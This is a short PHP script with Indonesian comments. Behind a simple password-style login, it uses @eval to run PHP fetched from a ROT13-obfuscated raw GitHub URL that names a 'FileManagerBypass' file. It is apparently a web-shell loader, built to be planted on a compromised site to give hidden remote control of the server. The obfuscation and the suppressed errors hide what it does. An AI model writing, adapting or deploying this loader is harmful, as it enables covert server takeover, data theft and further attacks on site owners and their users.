
<?php
session_start();
// https://raw.githubusercontent.com/Den1xxx/Filemanager/refs/heads/master/filemanager.php
// Hash bcrypt untuk username yang sudah di-generate sebelumnya
// Hash ini bisa didapatkan dengan password_hash("admin", PASSWORD_BCRYPT);
$stored_username_hash = '$2a$12$nDoUY4Dxy3A69zv1NOboceJ0IMHteIpr3yUTB4.z6CDfc8nT4yWUW'; // Hash dari "admin"

// Fungsi untuk menampilkan halaman login
function show_login_form($error = '', $csrf_token = '') {
    echo '<!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        ' . ($error ? '<p style="color: red;">' . htmlspecialchars($error) . '</p>' : '') . '
        <form method="post">
            <input type="hidden" name="csrf_token" value="' . htmlspecialchars($csrf_token) . '">
            <label>Username: <input type="text" name="username"></label><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>';
    exit;
}

// Fungsi untuk menghasilkan CSRF token
function generate_csrf_token() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Cek apakah pengguna sudah login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = trim($_POST['username'] ?? '');
        $csrf_token = $_POST['csrf_token'] ?? '';

        // Validasi CSRF token
        if ($csrf_token !== ($_SESSION['csrf_token'] ?? '')) {
            show_login_form("Invalid CSRF token.", generate_csrf_token());
        }

        // Validasi username menggunakan bcrypt
        if (password_verify($username, $stored_username_hash)) {
            $_SESSION['logged_in'] = true;
            unset($_SESSION['csrf_token']); // Hapus token setelah login
        } else {
            show_login_form("Username salah.", generate_csrf_token());
        }
    } else {
        // Tampilkan form login jika belum ada data POST
        show_login_form('', generate_csrf_token());
    }
}

// Kode asli Anda (dijalankan hanya jika sudah login)
@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/j/ersf/urnqf/znva/SVyrZnantreOlcnff/jbbc-nfpvv.cuc")));
?>
